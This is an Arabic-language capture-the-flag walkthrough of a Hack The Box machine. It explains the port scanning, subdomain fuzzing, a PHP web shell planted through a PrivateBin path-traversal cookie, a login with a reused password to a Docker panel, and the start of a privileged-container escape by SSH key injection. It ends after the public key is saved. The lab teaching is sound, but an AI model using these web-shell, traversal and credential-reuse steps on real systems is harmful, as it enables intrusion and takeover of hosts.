فحص البورتات - Port Scanning
اكتشاف الخدمات الشغالة على المشين
🔍 ما هو الهدف من هذه الخطوة؟
نريد أن نعرف أي خدمات (Services) شغالة على المشين، لأن كل خدمة قد تكون نقطة دخول. نستخدم أداة nmap وهي الأداة الأشهر لفحص الشبكات.

الأمر الأول - فحص سريع لكل البورتات:

Terminal - Kalibash
nmap -p- --open -sS --min-rate 5000 -Pn 10.129.245.50
-p-
افحص كل البورتات من 1 حتى 65535 (بدلاً من الـ 1000 الافتراضية فقط)
--open
اعرض فقط البورتات المفتوحة، اخفِ المغلقة لتوفير الوقت
-sS
SYN Scan = فحص سريع وصامت لا يكمل الـ TCP handshake
--min-rate 5000
أرسل على الأقل 5000 packet في الثانية = فحص سريع جداً
-Pn
تجاوز الـ ping (HTB machines لا ترد على ping عادةً)
✅ النتيجة
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3552/tcp open  ???   # ← مهم! تحقق منه لاحقاً

الأمر الثاني - فحص تفصيلي للبورتات المفتوحة فقط:

-sC
شغّل الـ default scripts للحصول على معلومات إضافية (مثل عنوان الصفحة وغيره)
-sV

اكتشاف الـ Subdomains
Virtual Host Enumeration - البحث عن مواقع مخفية
🔍 ما هو Virtual Host؟
نفس الـ IP يمكن أن يستضيف عدة مواقع مختلفة عبر أسماء مختلفة. مثلاً: mcp.kobold.htb و bin.kobold.htb كلاهما على نفس الـ IP لكنهما مواقع مختلفة تماماً.

الخطوة 1 - إضافة الـ Domain لـ /etc/hosts:

Terminal - Kalibash
sudo nano /etc/hosts

# أضف هذا السطر:
10.129.245.50    kobold.htb
⚠️ هذه الخطوة ضرورية لأن المشين يستخدم اسم domain وليس IP مباشرة. بدونها لن تتمكن من الوصول للموقع.

الخطوة 2 - فحص الـ Subdomains بـ ffuf:

Terminal - Kalibash
ffuf -u https://kobold.htb \
     -H "Host: FUZZ.kobold.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs 154
-u https://kobold.htb
الـ URL ثابت لا يتغير - نحن لا نغير المسار
-H "Host: FUZZ.kobold.htb"
كلمة FUZZ تتغير من القائمة - هنا يكون التخمين في الـ Host header
-w /usr/.../subdomains.txt
قائمة الكلمات للتخمين - تحتوي على آلاف الأسماء الشائعة
-fs 154
اخفِ الـ responses بحجم 154 bytes (هذا هو الرد الافتراضي للصفحة غير الموجودة)
💡 لماذا -fs 154 وليس رقم آخر؟
أول ما تشغل ffuf بدون -fs ستشوف نفس الحجم يتكرر في كل النتائج. ذاك الرقم المتكرر هو الرد الافتراضي (404 مخفي). تضعه في -fs لإخفائه وتظهر فقط النتائج المختلفة.
✅ النتيجة - Subdomains مكتشفة
mcp   200   → mcp.kobold.htb   # MCP Jam - التطبيق الرئيسي
bin   200   → bin.kobold.htb   # PrivateBin - أداة مشاركة النصوص

🔍 ما هو MCP Jam؟
هو تطبيق ويب يعمل على port 3552، مصمم لتنسيق عمليات الـ MCP (Model Context Protocol). يحتوي على API endpoint اسمه /api/mcp/connect يقبل إعدادات تشغيل برامج من المستخدم بدون أي تحقق من الهوية.

الأمر - اختبار الـ Endpoint:

Terminal - Kalibash
curl -k https://mcp.kobold.htb/api/mcp/connect \
     -H "Content-Type: application/json" \
     -d '{"serverId": "test"}'
curl
أداة لإرسال HTTP requests من الـ terminal
-k
تجاهل أخطاء SSL (الشهادة غير موثوقة في HTB)
-H "Content-Type: application/json"
أخبر السيرفر أن البيانات بصيغة JSON
-d '{"serverId": "test"}'
البيانات المرسلة في الـ Body
✅ الرد من السيرفر
{"success":false,"error":"serverConfig is required"}
🎯 هذا الرد يعني: الـ Endpoint شغال وموجود، ويطلب حقل serverConfig في الـ JSON. اسم هذا الحقل يوحي أنه يقبل إعدادات لتشغيل برنامج. هذه هي الثغرة!

السيرفر يسمح لأي شخص (بدون login) بإرسال اسم برنامج وسيشغله. هذا مثل إعطاء أي غريب مفاتيح منزلك وقول "افعل ما تشاء".

استغلال PrivateBin - Path Traversal + PHP RCE
كتابة PHP خبيث واستغلال ثغرة Path Traversal
🔍 ما هو Path Traversal؟
PrivateBin يقبل cookie اسمها template لتحديد قالب التصميم. المفترض يقرأ من: /privatebin-data/templates/XXXX لكن إذا وضعنا ../data/pwn يصبح: /privatebin-data/templates/../data/pwn.php وهذا يعني: /privatebin-data/data/pwn.php ← ملفنا الخبيث!

الخطوة 1 - اكتب ملف PHP خبيث (من shell بتاع ben):

Shell - ben@koboldbash
cat > /privatebin-data/data/pwn.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
cat > /path/file.php
اكتب محتوى إلى ملف جديد
<< 'EOF'
Heredoc: اكتب حتى تجد كلمة EOF في سطر وحده
كود PHP: نفّذ أي أمر يأتي في parameter اسمه cmd

الخطوة 2 - اختبار التنفيذ (من جهاز Kali):

Terminal - Kalibash
curl -k https://bin.kobold.htb/ \
  -b "template=../data/pwn" \
  -G --data-urlencode "cmd=id"
-b "template=../data/pwn"
أرسل cookie اسمها template بقيمة ../data/pwn ← Path Traversal
-G
أرسل الـ data كـ GET parameters في الـ URL
--data-urlencode "cmd=id"
أرسل parameter اسمه cmd بقيمة id (مع URL encoding تلقائي)
✅ النتيجة
uid=65534(nobody) gid=82(www-data) groups=82(www-data)
# السيرفر نفّذ أمر id ✅ عندنا RCE!
💡 كيف يعمل Path Traversal هنا؟
PrivateBin يقرأ template من:
/privatebin-data/templates/ + [قيمة الـ cookie]

نحن أرسلنا:  template=../data/pwn
النتيجة:     /privatebin-data/templates/../data/pwn
يُحلّ إلى:   /privatebin-data/data/pwn.php  ← ملفنا!

تسجيل الدخول على Arcane
Password Reuse - استخدام نفس كلمة المرور على خدمة أخرى
🔍 ما هو Arcane؟
Arcane هو Docker Management Panel يعمل على port 3552. واجهة ويب تسمح بإنشاء وإدارة Docker containers بالكامل من المتصفح. الخطر: إذا دخلنا عليه كـ admin، نقدر نصنع containers بصلاحيات كاملة!
🔍 لماذا جربنا username = "arcane"؟
الـ documentation الرسمية لـ Arcane تقول بوضوح:

Default username: arcane
Default password: arcane-admin

لكن الـ default password مُغيَّر — فجربنا كلمة MySQL التي وجدناها في الـ config. هذا يُسمى Password Reuse: نفس الشخص استخدم نفس كلمة المرور لأكثر من خدمة.

الأمر - تسجيل الدخول عبر API:

Terminal - Kalibash
curl -s -X POST http://kobold.htb:3552/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"arcane","password":"ComplexP@sswordAdmin1928"}'
-s
Silent mode - لا يعرض شريط التقدم، يعرض الـ output فقط
-X POST
نوع الـ request هو POST (إرسال بيانات)
"username":"arcane"
اسم المستخدم الافتراضي لـ Arcane
"password":"ComplexP@sswordAdmin1928"
كلمة MySQL التي استخرجناها من conf.php - password reuse!
✅ النتيجة - دخول ناجح!
{
  "success": true,
  "data": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhY2Nlc3MiLCJleHAiOjE3..."
  }
}
💡 ما هو JWT Token هذا؟
JWT (JSON Web Token) هو "تذكرة رقمية" مؤقتة تثبت هويتك للسيرفر. بدلاً من إرسال username/password في كل request، ترسل هذا الـ token.

كل request بعدها يجب أن يحمل هذا الـ Header:
Authorization: Bearer eyJhbGci...

الأمر - احفظ الـ Token في متغير:

Terminal - Kalibash
TOKEN=$(curl -s -X POST http://kobold.htb:3552/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"arcane","password":"ComplexP@sswordAdmin1928"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['token'])")

echo $TOKEN   # تحقق أن الـ token محفوظ

Docker Escape - الهروب للـ Host
Privileged Container + Bind Mount → SSH Key Injection
🔍 ما هو Docker Escape؟
الـ Containers عادةً معزولة تماماً عن الـ Host (السيرفر الحقيقي). لكن هناك استثناء خطير: إذا أنشأت container بـ privileged mode وعملت bind mount لـ filesystem الـ Host، فأنت في الحقيقة تتحكم في ملفات الـ Host مباشرة من داخل الـ Container.

هذا مثل وضع شاشة زجاجية بين سجين والعالم الخارجي، ثم جعل الزجاجة شفافة وقابلة للمرور — الحاجز لا يحجب شيئاً.
💡 ما الفرق بين Container عادي و Privileged؟
Container عادي:
  - معزول عن الـ Host
  - لا يمكنه الوصول لـ devices الـ Host
  - لا يمكنه تعديل kernel settings

Container بـ privileged: true
  - له نفس صلاحيات root على الـ Host
  - يقدر يرى كل devices الـ Host
  - يقدر يكتب على أي ملف في الـ Host عبر bind mount

الخطوة 1 - توليد SSH Key Pair:

Terminal - Kalibash
ssh-keygen -t rsa -b 4096 -f pwn_key -N ""

# -t rsa    → نوع التشفير RSA
# -b 4096   → طول المفتاح 4096 bit (آمن جداً)
# -f pwn_key → اسم الملف المُنتَج
# -N ""     → بدون passphrase (كلمة مرور على المفتاح)

# ينتج ملفين:
# pwn_key     ← المفتاح الخاص (نبقيه عندنا)
# pwn_key.pub ← المفتاح العام (نرسله للسيرفر)
💡 كيف يعمل نظام SSH Keys؟
المفتاح الخاص (private key):  يبقى عندك فقط - سري
المفتاح العام  (public key):  يُوضع على السيرفر في ملف authorized_keys

عند الاتصال:
  أنت  →  "عندي المفتاح الخاص لهذا المفتاح العام"
  السيرفر → يتحقق → يتطابق → ✅ ادخل بدون كلمة مرور

الخطوة 2 - احفظ الـ Public Key في متغير:

Terminal - Kalibash
PUB=$(cat pwn_key.pub)
echo $PUB

# مثال على شكل المفتاح العام:
# ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQD... user@kali
